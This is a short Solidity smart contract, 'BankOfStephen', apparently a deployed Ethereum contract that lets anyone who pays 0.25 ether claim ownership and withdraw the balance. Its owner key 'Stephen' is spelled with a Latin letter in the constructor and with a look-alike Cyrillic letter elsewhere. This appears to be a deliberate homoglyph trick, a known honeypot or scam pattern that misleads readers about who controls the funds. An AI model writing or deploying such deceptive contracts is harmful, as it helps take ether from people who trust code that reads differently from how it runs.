/**
 *Submitted for verification at Etherscan.io on 2018-05-21
 */

pragma solidity ^0.4.24;

contract BankOfStephen {
    mapping(bytes32 => address) private owner;

    mapping(uint => address) private owner2;

    constructor() public {
        owner["Stephen"] = msg.sender;
        // owner2[0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b] = msg.sender;
    }

    function becomeOwner() public payable {
        require(msg.value >= 0.25 ether);
        owner["Stephеn"] = msg.sender;
        owner2[2] = msg.sender;
    }

    function withdraw() public {
        require(owner["Stephеn"] == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
